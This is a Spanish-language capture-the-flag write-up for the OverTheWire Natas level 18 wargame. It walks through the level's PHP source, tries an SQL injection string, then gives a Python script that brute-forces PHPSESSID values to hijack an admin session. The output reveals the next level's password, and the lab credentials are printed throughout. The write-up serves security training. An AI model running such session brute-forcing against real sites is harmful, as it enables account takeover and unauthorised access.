#Natas Level 17 → Level 18

Username: natas18

URL:      http://natas18.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas18.natas.labs.overthewire.org** 
- **Usuario    : natas18**
- **Contraseña : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP**

La contraseña la hemos sacado del nivel anterior.

Entramos a la web y nos muestra dos campons donde tenemos que introducir el **usuario** y la **contraseña** para poder conseguir las credenciales para el nivel **natas19**

```html
Please login with your admin account to retrieve credentials for natas19.
Username: 
Password: 
```

Vamos a ver el código fuente de la prueba:

```php
<? 

$maxid = 640; // 640 should be enough for everyone 

function isValidAdminLogin()                         
{  
    if($_REQUEST["username"] == "admin")              /* This method of authentication appears to be unsafe and has been disabled for now. */ 
    { 
        //return 1; 
    } 

    return 0; 
} 

function isValidID($id) 
{ 
    return is_numeric($id); 
} 

function createID($user) 
{  
    global $maxid; 
    return rand(1, $maxid); 
} 

function debug($msg) 
{
    if(array_key_exists("debug", $_GET)) 
    { 
        print "DEBUG: $msg<br>"; 
    } 
} 

function my_session_start() 
{ 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) 
    { 
    if(!session_start()) 
    { 
        debug("Session start failed"); 
        return false; 
    } 
    else 
    { 
        debug("Session start ok"); 
        if(!array_key_exists("admin", $_SESSION)) 
        { 
          debug("Session was old: admin flag set"); 
          $_SESSION["admin"] = 0; // backwards compatible, secure 
        } 
        return true; 
    } 
    } 

    return false; 
} 

function print_credentials() 
{ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) 
    { 
      print "You are an admin. The credentials for the next level are:<br>"; 
      print "<pre>Username: natas19\n"; 
      print "Password: <censored></pre>"; 
    } 
    else 
    { 
      print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
} 


$showform = true; 
if(my_session_start()) 
{ 
    print_credentials(); 
    $showform = false; 
} 
else 
{ 
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) 
    { 
      session_id(createID($_REQUEST["username"])); 
      session_start(); 
      $_SESSION["admin"] = isValidAdminLogin(); 
      debug("New session started"); 
      $showform = false; 
      print_credentials(); 
    } 
}  

if($showform) 
{ 
?> 

<p> 
Please login with your admin account to retrieve credentials for natas19. 
</p> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 

<? } ?>
```

De todo el código que nos aparece, lo más importante está en la función **print_credentials()** en el que vemo el siguiente código:

```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) 
```

Intentamos logearnos con el truco de **SQL Injection** de introducir el usuario **admin** y la contraseña ** ' or '1'='1** pero nos muestra el siguiente mensaje

```html
You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.
```

Observamos como el campo **$_SESSION["admin"] == 1** tiene que estar a valor **1** pero nos encontramos que la función **isValidAdminLogin()** tiene comentado el **return 1** lo que impide poner el valor de 1 en ese campo

```php
function isValidAdminLogin()                         
{  
    if($_REQUEST["username"] == "admin")              /* This method of authentication appears to be unsafe and has been disabled for now. */ 
    { 
        //return 1; 
    } 
    return 0; 
} 
...
 $_SESSION["admin"] = isValidAdminLogin();    
```

Así que vamos a seguir mirando el código fuente para ver como podemos hacerle creer que somos los usuarios **admin**

Vamos a fijarnos en la función **created_ID** y el valor máximo de **$maxid=640**

```php
$maxid = 640; // 640 should be enough for everyone

function createID($user) 
{  
    global $maxid; 
    return rand(1, $maxid); 
} 
```

Esto crea una sesión aleatoria entre 1-640 donde los usuarios podrán ir logeandose. Además de los usuarios, también estará el usuario admin, al que también asignará su **PHPSESSID** correspondiente.

Utilizamos la herramienta **EditThisCookie** Para comprobar que efectivamente se manda un valor numérico en el campo **PHPSESSID** al servidor para que identifique al usuario. 

En este caso nos da un poco igual que usuario y password poner, ya que vamos a intentar acceder al sistema asignando valores entre **1-640** al campo **PHPSESSID** y viendo si nos devuelve el texto **You are an admin** tal y como hemos visto en algún reto anterior.

Para ello vamos a escribir un script en python que nos va a permitir hacer un **request** a la página del reto **Natas18** pasándole como parámetro un **PHPSESSID** con valores entre 1-640.

Lo llamaremos natas18.py

```python
import requests
 
for sessid in range(641):
	r = requests.get('http://natas18.natas.labs.overthewire.org?debug=1', auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies={'PHPSESSID':str(sessid)})
 
	if 'You are an admin' in r.content:
	    print r.content 
	    break
	else:
		print "PHPSESSID -> {0}\t NOPE :( ".format(str(sessid))
```

Y lo ejecutamos a ver si encontramos el **PHPSESSID** que nos devuelva la contraseña para el siguiente nivel.

```html
ikerburguera@:~/Desktop$ python natas18.py
PHPSESSID -> 0	 NOPE :( 
PHPSESSID -> 1	 NOPE :( 
PHPSESSID -> 2	 NOPE :( 
PHPSESSID -> 3	 NOPE :( 
...
PHPSESSID -> 606	 NOPE :( 
PHPSESSID -> 607	 NOPE :( 
PHPSESSID -> 608	 NOPE :( 
PHPSESSID -> 609	 NOPE :( 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
Parece ser que en la **PHPSESSID=610** hemos podido entrar como usuario **ADMIN** :sunglasses: :beers:

**FLAG** = {4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs}




